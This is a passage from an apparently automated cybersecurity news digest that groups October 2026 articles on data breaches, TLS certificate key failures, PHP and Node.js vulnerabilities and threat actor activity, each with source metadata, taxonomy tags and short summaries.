protect a 1m+ workforce, a global corporate organization with an extensive supply chain and ongoing M&A activity. This write up is based on the original Forrester Total Economic Impact‚Ñ¢ (TEI) study, an independently held private collaboration between our client and them. The goals were to determine the cost savings gains that could be achieved by using external threat reconnaissance to support a proactive cybersecurity organization to safeguard company reputation, share value, and careers, from cyber risks. Defining the ROI of Threat Reconnaissance - What Matters Most With access to the proper tools, threat hunting empowers analysts to act on threats to your organization in real time, instead of the usual reactive responses that drain resources and budget. It opens up a new range of preemptive capabilities that can turn your threat analysts into a powerful layer of proactive cyber defense.It has When justifying budgets and helping the business understand the importance of your threat hunting function consider where it has direct impact on business outcomes: Stop a data breach from happening with a predictive response to persistent threat actors Reduce the amount of tools needed and lower the swivel chair security tax on your analysts Detect impending data breaches via your supply chain and other 3rd parties Address the business risk of new company acquisitions via M&A Remove tedious analyst work with automation so they could focus on strategic cybersecurity initiatives Predictive Response Pays Off First we will focus on the most obvious area where improved threat intelligence pays off; preventing data breaches from happening in the first place . In this real world scenario, we are profiling a sophisticated cybersecurity team that could already show that they were able to reduce the standard cost of a data breach by more than 75%. As a retail conglomerate and global brand, they are highly targeted and sought after ‚Äúprize‚Äù with threat actors. They wanted to close the gap by another 40% reduction in projected costs due to a data breach. The team had the skills and experience to further close the gap on corporate risk and cost by transitioning from providing reactive cybersecurity to a more pro
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Threat Intelligence: A CISO ROI Guide - Prevent Data Breaches
  - Published: 2026-10-19T14:07:29+00:00
  - Link: https://www.team-cymru.com/post/threat-intelligence-a-ciso-roi-guide-prevent-data-breaches
  - Summary: Uncover the power of threat intelligence for a technology company. Learn how to prevent data breaches and maximize ROI as a CISO with expert guidance.

### Cluster 597b974a57 — score 11

- Title: Compromised TLS Certificates
- Source: Schneier on Security (practitioner_analysis)
- Published: 2026-10-23T11:04:22+00:00
- Link: https://www.schneier.com/blog/archives/2026/10/compromised-tls-certificates.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: mfa_bypass
- affected_industries: education, government
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: mfa_bypass
- affected_industries: government, education
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Summary

```
The Indian CA eMudhra Limited has eight TLS certificates with laughably weak private keys : The compromised eMudhra keys were defective at a level that’s challenging the imagination of many of the engineers studying the incident. A normal size for a NIST P-384 elliptic curve cryptography private key contains roughly 384 bits of entropy, a size allowing almost 2 384 , or a number with 116 digits, different possibilities. The private key sizes of the compromised keys ranged from 3 to 8 bits. Astonishingly, the private keys were 4, 56, 66, 115, 155, 156, 230, 237...
```

#### Full body

```
Compromised TLS Certificates The Indian CA eMudhra Limited has eight TLS certificates with laughably weak private keys : The compromised eMudhra keys were defective at a level that’s challenging the imagination of many of the engineers studying the incident. A normal size for a NIST P-384 elliptic curve cryptography private key contains roughly 384 bits of entropy, a size allowing almost 2 384 , or a number with 116 digits, different possibilities. The private key sizes of the compromised keys ranged from 3 to 8 bits. Astonishingly, the private keys were 4, 56, 66, 115, 155, 156, 230, 237. “That is extremely in the ‘this should not be possible’ category,” Valdorda said. “Maybe some horribly dangerous key generation interface has a ‘size’ parameter and they set it to 1 by mistake???” Ben Cartwright-Cox, director of BGP.tools, said: “My guess is that it’s example code that accidentally leaked to production, but hard to know. But it’s bonkers that no one noticed.” At this early stage, the most immediate threat appears to be for those using VPNs, especially in countries with governments likely to maliciously intercept traffic. There are likely many other cases for concern. End users largely have no recourse other than to hold off using many non-browser forms of TLS communication until they receive assurances updates are in place. The whole certificate regime has long been a mess: The incident is the latest to expose a fatal flaw in the TLS regimen. It’s only as strong as its weakest link, which in this case was eMudhra. Fortunately, transparency logs account for much of that failure, but this measure requires parties to actively monitor massive feeds and works only after unauthorized certificates have been issued. eMudhra representatives weren’t immediately available to answer questions. One caveat: exploiting compromised certificates requires an active adversary-in-the-middle attack, meaning the attacker must act as a proxy between two TLS parties and receive encrypted traffic, decrypt it, reencrypt it, and send it to the other party. Such capabilities, in some cases, are usually limited to only the most well-resourced attackers. People with control of a local network­at a coffee shop, university, or other organization­face much less of a challenge. Cleanup of this is going to be another mess—and it’s right on top of the PHP vulnerabilities. Some more information . Tags: India , keys , TLS Posted on October 23, 2026 at 7:04 AM • 11 Comments
```

#### Corroborating sources (1)

- **Schneier on Security** (practitioner_analysis)
  - Title: Compromised TLS Certificates
  - Published: 2026-10-23T11:04:22+00:00
  - Link: https://www.schneier.com/blog/archives/2026/10/compromised-tls-certificates.html
  - Summary: The Indian CA eMudhra Limited has eight TLS certificates with laughably weak private keys : The compromised eMudhra keys were defective at a level that’s challenging the imagination of many of the engineers studying the incident. A normal size for a NIST P-384 elliptic curve cryptography private key contains roughly 384 bits of entropy, a size allowing almost 2 384 , or a number with 116 digits, different possibilities. The private key sizes of the compromised keys ranged from 3 to 8 bits. Astonishingly, the private keys were 4, 56, 66, 115, 155, 156, 230, 237...

### Cluster 361b81966e — score 11

- Title: New Serious PHP Vulnerabilities Released and Patched
- Source: Schneier on Security (practitioner_analysis)
- Published: 2026-10-22T13:26:51+00:00
- Link: https://www.schneier.com/blog/archives/2026/10/new-serious-php-vulnerabilities-released-and-patched.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: LiteSpeed

#### Cluster taxonomy (union across members)
- affected_products: LiteSpeed
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- affected_products: LiteSpeed
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
PHP maintainers have released fixes for two critical vulnerabilities: PHP 8.5.12, 8.4.27, 8.3.36 and 8.2.35 fix two critical vulnerabilities that can allow unauthenticated remote code execution. All PHP users are strongly encouraged to update immediately. Who is at risk: all PHP installations serving web requests, including PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP and LiteSpeed. We consider the risk highest for mod_php, with a demonstrated exploit where an unauthenticated request can trigger the attack before any application code runs...
```

#### Corroborating sources (1)

- **Schneier on Security** (practitioner_analysis)
  - Title: New Serious PHP Vulnerabilities Released and Patched
  - Published: 2026-10-22T13:26:51+00:00
  - Link: https://www.schneier.com/blog/archives/2026/10/new-serious-php-vulnerabilities-released-and-patched.html
  - Summary: PHP maintainers have released fixes for two critical vulnerabilities: PHP 8.5.12, 8.4.27, 8.3.36 and 8.2.35 fix two critical vulnerabilities that can allow unauthenticated remote code execution. All PHP users are strongly encouraged to update immediately. Who is at risk: all PHP installations serving web requests, including PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP and LiteSpeed. We consider the risk highest for mod_php, with a demonstrated exploit where an unauthenticated request can trigger the attack before any application code runs...

### Cluster ab65df23ba — score 11

- Title: Hacker leaks 281 GB of data from Germany’s far-right AfD party
- Source: Graham Cluley (practitioner_analysis)
- Published: 2026-10-23T12:29:16+00:00
- Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/hacker-leaks-281-gb-data-germany-afd
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Summary

```
The AfD has confirmed that hackers breached its hosting provider. A leak site now claims to offer 421,179 of the party’s internal emails, and shows AI-written summaries rather than the emails themselves. Read more in my article on the Hot for Security blog.
```

#### Corroborating sources (1)

- **Graham Cluley** (practitioner_analysis)
  - Title: Hacker leaks 281 GB of data from Germany’s far-right AfD party
  - Published: 2026-10-23T12:29:16+00:00
  - Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/hacker-leaks-281-gb-data-germany-afd
  - Summary: The AfD has confirmed that hackers breached its hosting provider. A leak site now claims to offer 421,179 of the party’s internal emails, and shows AI-written summaries rather than the emails themselves. Read more in my article on the Hot for Security blog.

### Cluster f5be091478 — score 11

- Title: Researchers Demonstrate Node2Shell RCE Exploit on Node.js Build Using Crafted Brotli Data
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-23T08:40:43+00:00
- Link: https://thehackernews.com/2026/10/researchers-demonstrate-node2shell-rce.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-111497

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-111497
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-111497
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Malicious Brotli data can make an application on an official build of Node.js run attacker-supplied code, security researchers at Imperva have demonstrated. Their "Node2Shell" proof of concept ran code on the official Node.js 24.22.0 image for Linux arm64, with no debugger or custom build, by feeding crafted data to the bundled Brotli decoder (CVE-2026-111497). Node.js disclosed the flaw
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Researchers Demonstrate Node2Shell RCE Exploit on Node.js Build Using Crafted Brotli Data
  - Published: 2026-10-23T08:40:43+00:00
  - Link: https://thehackernews.com/2026/10/researchers-demonstrate-node2shell-rce.html
  - Summary: Malicious Brotli data can make an application on an official build of Node.js run attacker-supplied code, security researchers at Imperva have demonstrated. Their "Node2Shell" proof of concept ran code on the official Node.js 24.22.0 image for Linux arm64, with no debugger or custom build, by feeding crafted data to the bundled Brotli decoder (CVE-2026-111497). Node.js disclosed the flaw

### Cluster 140c89d442 — score 10

- Title: The Current Landscape of OAuth Attacks
- Source: Unit 42 (threat_research_primary)
- Published: 2026-10-22T17:00:25+00:00
- Link: https://unit42.paloaltonetworks.com/current-landscape-oauth-attacks/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Unit 42 explores modern OAuth threats and actionable steps organizations can take to protect their environments. The post The Current Landscape of OAuth Attacks appeared first on Unit 42 .
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: The Current Landscape of OAuth Attacks
  - Published: 2026-10-22T17:00:25+00:00
  - Link: https://unit42.paloaltonetworks.com/current-landscape-oauth-attacks/
  - Summary: Unit 42 explores modern OAuth threats and actionable steps organizations can take to protect their environments. The post The Current Landscape of OAuth Attacks appeared first on Unit 42 .

### Cluster b4eef500a6 — score 10

- Title: “Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities
- Source: Unit 42 (threat_research_primary)
- Published: 2026-10-21T14:00:24+00:00
- Link: https://unit42.paloaltonetworks.com/ai-assisted-cybercrime-analysis/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: credential_theft
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
An investigation into a threat actor bypassing AI safety controls to coordinate credential theft, VoIP fraud planning, and database exfiltration. The post “Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities appeared first on Unit 42 .
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: “Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities
  - Published: 2026-10-21T14:00:24+00:00
  - Link: https://unit42.paloaltonetworks.com/ai-assisted-cybercrime-analysis/
  - Summary: An investigation into a threat actor bypassing AI safety controls to coordinate credential theft, VoIP fraud planning, and database exfiltration. The post “Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities appeared first on Unit 42 .

### Cluster ffb7745d72 — score 10

- Title: Behind Japan’s Warnings of a Cyber Crisis
- Source: Recorded Future (threat_research_primary)
- Published: 2026-10-22T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/japan-cyber-crisis-warnings
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Explore Japan's 2026 cyber crisis, rising breach trends, AI tooling, legacy systems, and key mitigation strategies to protect organizations.
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Behind Japan’s Warnings of a Cyber Crisis
  - Published: 2026-10-22T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/japan-cyber-crisis-warnings
  - Summary: Explore Japan's 2026 cyber crisis, rising breach trends, AI tooling, legacy systems, and key mitigation strategies to protect organizations.

### Cluster a28b47ffdb — score 10

- Title: I had plans for that second
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-10-22T18:04:32+00:00
- Link: https://blog.talosintelligence.com/i-had-plans-for-that-second/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
The Earth is speeding up, the leap second is being abolished, oh, and there's critical vulnerabilities in PHP.
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: I had plans for that second
  - Published: 2026-10-22T18:04:32+00:00
  - Link: https://blog.talosintelligence.com/i-had-plans-for-that-second/
  - Summary: The Earth is speeding up, the leap second is being abolished, oh, and there's critical vulnerabilities in PHP.

### Cluster d5a5de35e0 — score 10

- Title: 19th October – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-10-19T14:54:40+00:00
- Link: https://research.checkpoint.com/2026/19th-october-threat-intelligence-report/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 19th October, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES CenterPoint Energy, a US utility company serving Texas and several other states, has disclosed a data breach affecting more than 1 million Texas residents. Unauthorized access to an external system exposed names, […] The post 19th October – Threat Intelligence Report appeared first on Check Point Research .
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 19th October – Threat Intelligence Report
  - Published: 2026-10-19T14:54:40+00:00
  - Link: https://research.checkpoint.com/2026/19th-october-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 19th October, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES CenterPoint Energy, a US utility company serving Texas and several other states, has disclosed a data breach affecting more than 1 million Texas residents. Unauthorized access to an external system exposed names, […] The post 19th October – Threat Intelligence Report appeared first on Check Point Research .

### Cluster 66edb4d266 — score 10

- Title: MythicRatatoskr: An Yggdrasil-enabled backdoor deployed in a UAC-0099-Sandworm collaboration
- Source: ESET WeLiveSecurity (threat_research_primary)
- Published: 2026-10-22T08:45:00+00:00
- Link: https://www.welivesecurity.com/en/eset-research/mythicratatoskr-yggdrasil-enabled-backdoor-deployed-uac0099-sandworm-collaboration/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
ESET researchers uncover MythicRatatoskr – a previously unknown Go-based backdoor hiding its C&C server inside the Yggdrasil mesh network – that paved the way for a destructive attack against a Ukrainian grain firm
```

#### Corroborating sources (1)

- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: MythicRatatoskr: An Yggdrasil-enabled backdoor deployed in a UAC-0099-Sandworm collaboration
  - Published: 2026-10-22T08:45:00+00:00
  - Link: https://www.welivesecurity.com/en/eset-research/mythicratatoskr-yggdrasil-enabled-backdoor-deployed-uac0099-sandworm-collaboration/
  - Summary: ESET researchers uncover MythicRatatoskr – a previously unknown Go-based backdoor hiding its C&C server inside the Yggdrasil mesh network – that paved the way for a destructive attack against a Ukrainian grain firm

### Cluster 085e684775 — score 10

- Title: Audit-Ready Isn’t Attack-Ready.
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-21T16:33:28+00:00
- Link: https://horizon3.ai/intelligence/blogs/audit-ready-isnt-attack-ready-financial-security/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Passing an audit doesn't guarantee attack readiness. Explore how three financial and insurance organizations use NodeZero to challenge security assumptions, expand penetration testing coverage, uncover exploitable attack paths, and verify remediation through continuous exposure management.
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Audit-Ready Isn’t Attack-Ready.
  - Published: 2026-10-21T16:33:28+00:00
  - Link: https://horizon3.ai/intelligence/blogs/audit-ready-isnt-attack-ready-financial-security/
  - Summary: Passing an audit doesn't guarantee attack readiness. Explore how three financial and insurance organizations use NodeZero to challenge security assumptions, expand penetration testing coverage, uncover exploitable attack paths, and verify remediation through continuous exposure management.

### Cluster 401a2a13e4 — score 10

- Title: Horizon3 Surpasses $100 Million ARR, Marking a Key Milestone in the Shift to Continuous, Production-Safe Autonomous Security
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-20T13:02:00+00:00
- Link: https://horizon3.ai/news/press-release/horizon3-surpasses-100-million-arr/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Horizon3 has surpassed $100 million in annual recurring revenue, with ARR growing more than 120% year over year. The milestone reflects increasing adoption of the NodeZero platform, a channel-first growth strategy, and demand for continuous, production-safe autonomous penetration testing. Horizon3 also outlined its next phase of investment in sovereign cyber AI regions, critical infrastructure centers of excellence, and attack-defend AI learning loops.
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Horizon3 Surpasses $100 Million ARR, Marking a Key Milestone in the Shift to Continuous, Production-Safe Autonomous Security
  - Published: 2026-10-20T13:02:00+00:00
  - Link: https://horizon3.ai/news/press-release/horizon3-surpasses-100-million-arr/
  - Summary: Horizon3 has surpassed $100 million in annual recurring revenue, with ARR growing more than 120% year over year. The milestone reflects increasing adoption of the NodeZero platform, a channel-first growth strategy, and demand for continuous, production-safe autonomous penetration testing. Horizon3 also outlined its next phase of investment in sovereign cyber AI regions, critical infrastructure centers of excellence, and attack-defend AI learning loops.

### Cluster 4e3381e10d — score 10

- Title: How bug bounty sharpens one researcher’s security skills
- Source: GitHub Security Lab (offensive_vulnerability_research)
- Published: 2026-10-22T17:21:30+00:00
- Link: https://github.blog/security/how-bug-bounty-sharpens-one-researchers-security-skills/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
As Cybersecurity Awareness Month continues, the GitHub Bug Bounty team spotlights @r31n, diving into their research approach, favorite bug classes, and advice for aspiring hackers. The post How bug bounty sharpens one researcher’s security skills appeared first on The GitHub Blog .
```

#### Corroborating sources (1)

- **GitHub Security Lab** (offensive_vulnerability_research)
  - Title: How bug bounty sharpens one researcher’s security skills
  - Published: 2026-10-22T17:21:30+00:00
  - Link: https://github.blog/security/how-bug-bounty-sharpens-one-researchers-security-skills/
  - Summary: As Cybersecurity Awareness Month continues, the GitHub Bug Bounty team spotlights @r31n, diving into their research approach, favorite bug classes, and advice for aspiring hackers. The post How bug bounty sharpens one researcher’s security skills appeared first on The GitHub Blog .

### Cluster e8059a89a7 — score 10

- Title: Q3 2026 Threat Update: Attackers Are Exploiting Vulnerabilities Within 3 Days
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-21T13:00:00+00:00
- Link: https://www.rapid7.com/blog/post/tr-q3-2026-threat-update-attackers-exploiting-vulnerabilities-within-3-days
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ransomware_extortion
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, apt_espionage
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Three days is the average time between a high-severity vulnerability becoming public and its exploitation, according to the latest Quarterly Threat Landscape Report from Rapid7. And 71% of the exploitation tracked in Q3 occurred within the first seven days. For security teams already managing growing vulnerability backlogs, this creates a difficult question: How do you reduce exposure when attackers can exploit vulnerabilities before your next patching window? Rapid7's Q3 2026 research brings together vulnerability intelligence, ransomware activity, APT tracking, and underground forum intelligence to show where attacker activity is concentrated. The exploitation window has narrowed, big time Rapid7 tracked 43 newly exploited high- and critical-severity vulnerabilities this quarter, down 7% from Q2 but still 19% higher than the same period last year. The number of newly exploited vulnerabilities isn't growing at the same rate as disclosures. The more pressing concern is how quickly atta
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Q3 2026 Threat Update: Attackers Are Exploiting Vulnerabilities Within 3 Days
  - Published: 2026-10-21T13:00:00+00:00
  - Link: https://www.rapid7.com/blog/post/tr-q3-2026-threat-update-attackers-exploiting-vulnerabilities-within-3-days
  - Summary: Three days is the average time between a high-severity vulnerability becoming public and its exploitation, according to the latest Quarterly Threat Landscape Report from Rapid7. And 71% of the exploitation tracked in Q3 occurred within the first seven days. For security teams already managing growing vulnerability backlogs, this creates a difficult question: How do you reduce exposure when attackers can exploit vulnerabilities before your next patching window? Rapid7's Q3 2026 research brings together vulnerability intelligence, ransomware activity, APT tracking, and underground forum intelligence to show where attacker activity is concentrated. The exploitation window has narrowed, big time Rapid7 tracked 43 newly exploited high- and critical-severity vulnerabilities this quarter, down 7% from Q2 but still 19% higher than the same period last year. The number of newly exploited vulnerabilities isn't growing at the same rate as disclosures. The more pressing concern is how quickly atta

### Cluster 9f4e7093bf — score 10

- Title: Quest Diagnostics warns of potential data theft after attack on lab service system
- Source: The Record (cyber_news_breach_reporting)
- Published: 2026-10-23T12:52:00+00:00
- Link: https://therecord.media/quest-diagnostics-network-intrusion
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: healthcare
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_industries: healthcare
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Nationwide lab test company Quest Diagnostics said one of its key systems may have experienced a breach of patient data.
```

#### Corroborating sources (1)

- **The Record** (cyber_news_breach_reporting)
  - Title: Quest Diagnostics warns of potential data theft after attack on lab service system
  - Published: 2026-10-23T12:52:00+00:00
  - Link: https://therecord.media/quest-diagnostics-network-intrusion
  - Summary: Nationwide lab test company Quest Diagnostics said one of its key systems may have experienced a breach of patient data.

### Cluster cc68ea44a4 — score 10

- Title: Quest Diagnostics confirms data breach exposed patient records
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-10-23T16:40:07+00:00
- Link: https://www.bleepingcomputer.com/news/security/quest-diagnostics-confirms-data-breach-exposed-patient-records/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
American clinical laboratory company Quest Diagnostics disclosed that patient records have been exposed after a threat actor gained unauthorized access to its Quanum LSM system. [...]
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Quest Diagnostics confirms data breach exposed patient records
  - Published: 2026-10-23T16:40:07+00:00
  - Link: https://www.bleepingcomputer.com/news/security/quest-diagnostics-confirms-data-breach-exposed-patient-records/
  - Summary: American clinical laboratory company Quest Diagnostics disclosed that patient records have been exposed after a threat actor gained unauthorized access to its Quanum LSM system. [...]

### Cluster fa09444a81 — score 10

- Title: Attackers Exploit Third Arista VCO Zero-Day in Four Months
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-10-23T09:58:34+00:00
- Link: https://www.securityweek.com/attackers-exploit-third-velocloud-orchestrator-zero-day-in-four-months/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The critical-severity SQL injection flaw allows attackers to access privileged internal functionality and gain operator privileges. The post Attackers Exploit Third Arista VCO Zero-Day in Four Months appeared first on SecurityWeek .
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Attackers Exploit Third Arista VCO Zero-Day in Four Months
  - Published: 2026-10-23T09:58:34+00:00
  - Link: https://www.securityweek.com/attackers-exploit-third-velocloud-orchestrator-zero-day-in-four-months/
  - Summary: The critical-severity SQL injection flaw allows attackers to access privileged internal functionality and gain operator privileges. The post Attackers Exploit Third Arista VCO Zero-Day in Four Months appeared first on SecurityWeek .

### Cluster 8d9dd0ee20 — score 10

- Title: 11 Million Impacted by Capcom Data Breach
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-10-23T08:34:14+00:00
- Link: https://www.securityweek.com/11-million-impacted-by-capcom-data-breach/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The hackers stole 11 million email addresses from CAPCOM ID and changed the login passwords for 196 accounts. The post 11 Million Impacted by Capcom Data Breach appeared first on SecurityWeek .
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: 11 Million Impacted by Capcom Data Breach
  - Published: 2026-10-23T08:34:14+00:00
  - Link: https://www.securityweek.com/11-million-impacted-by-capcom-data-breach/
  - Summary: The hackers stole 11 million email addresses from CAPCOM ID and changed the login passwords for 196 accounts. The post 11 Million Impacted by Capcom Data Breach appeared first on SecurityWeek .

### Cluster e78d58e081 — score 10

- Title: Quest Diagnostics Data Breach Exposed ‘Certain Patient Records’
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-10-23T08:25:06+00:00
- Link: https://www.securityweek.com/quest-diagnostics-reports-cyber-breach-affecting-certain-patient-records/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
In a regulatory filing, Quest Diagnostics reported unauthorized access to its Quanum Lab Services Manager, a platform where certain clients can place test orders. The post Quest Diagnostics Data Breach Exposed ‘Certain Patient Records’ appeared first on SecurityWeek .
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Quest Diagnostics Data Breach Exposed ‘Certain Patient Records’
  - Published: 2026-10-23T08:25:06+00:00
  - Link: https://www.securityweek.com/quest-diagnostics-reports-cyber-breach-affecting-certain-patient-records/
  - Summary: In a regulatory filing, Quest Diagnostics reported unauthorized access to its Quanum Lab Services Manager, a platform where certain clients can place test orders. The post Quest Diagnostics Data Breach Exposed ‘Certain Patient Records’ appeared first on SecurityWeek .

### Cluster c7af2499d1 — score 10

- Title: Capcom data breach exposes 11.7 million account records
- Source: Help Net Security (cyber_news_breach_reporting)
- Published: 2026-10-23T09:07:31+00:00
- Link: https://www.helpnetsecurity.com/2026/10/23/capcom-id-data-breach-11-million-records-exposed/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Players who signed up for Capcom’s online account service may want to look twice at emails that seem to come from the company. The company has disclosed that a third party gained unauthorized access to customer information linked to CAPCOM ID, the account people use to sign in to the company’s web services and to play some of its games online. It detected suspicious activity on October 19 and confirmed the intrusion the same day. … More → The post Capcom data breach exposes 11.7 million account records appeared first on Help Net Security .
```

#### Corroborating sources (1)

- **Help Net Security** (cyber_news_breach_reporting)
